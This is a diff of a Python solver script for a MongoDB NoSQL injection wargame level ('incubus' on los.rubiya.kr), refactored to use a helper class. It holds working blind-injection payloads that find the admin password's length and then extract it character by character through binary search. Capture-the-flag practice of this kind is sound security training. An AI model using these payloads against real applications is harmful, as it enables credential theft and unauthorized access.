@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
 import los
-import time
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
-    '''
+    """
     check string in response of request
     args[0]: response
-    '''
+    """
     return 'Hello admin' in args[0]
 
 
 def main():
-    '''
+    """
     Incubus 48 MongoDB NoSQL injection
 
     $db = mongodb_connect();
@@ -26,34 +26,25 @@ def main():
     $query = array("id" => "admin");
     $result = mongodb_fetch_array($db->prob_incubus->find($query));
     if($result['pw'] === $_GET['pw']) solve("incubus");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
+    other_param = {'id': 'admin'}
 
-    param = dict(pw="'||obj.pw.length>'%s")
-    len_of_key = los.find_key_len(url, param, check_func, cook)
+    payload = "'||obj.pw.length>'%s"
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
+    len_of_key = p.find_key_len(check_func)
 
-    print(len_of_key)
+    p.payload = f"'||obj.id=='admin'&&obj.pw[%d]<'%s"
+    result = p.find_binary(check_func, len_of_key, left=48, letter=True, start_i=0)
 
-    result = ''
-    num_of_requests = 0
-
-    for i in range(0, len_of_key):
-        param = {'pw': f"'||obj.id=='admin'&&obj.pw[{i}]<'%s"}
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             48, 127, cook, letter=True)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
-
-    print('num_of_requests:', num_of_requests)
-
-    param = {'id': 'admin', 'pw': result}
-    response = los.get_request(url, param, cook)
-
+    p.payload = result
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Incubus Clear!')
+        print('\nIncubus Clear!')
 
 
 if __name__ == '__main__':
